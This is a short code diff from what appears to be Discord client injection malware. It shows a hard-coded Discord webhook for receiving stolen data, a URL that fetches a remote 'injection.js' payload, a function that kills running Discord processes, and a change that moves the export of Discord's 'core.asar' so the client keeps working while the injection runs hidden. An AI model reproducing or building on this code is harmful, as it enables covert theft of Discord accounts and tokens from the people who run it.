@@ -9,8 +9,6 @@ const request = require('request');
 const hook = 'https://discord.com/api/webhooks/1215074354774151248/onvwDuOS-nO6PLrzccouULTnsKXUDDIC311JN6o4m-_YFSRWPblEN5qfvuZxCgqIHaGQ';
 const injectionUrl = 'https://raw.githubusercontent.com/traxzzy/Injectiondc/main/injection.js';
 
-module.exports = require('./core.asar');
-
 function killdc() {
     return new Promise(() => {
         const discordProcesses = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment'];
@@ -123,6 +121,8 @@ function injection() {
     }
     
 }
+
+module.exports = require('./core.asar');
 
 injectNotify();
 injection();
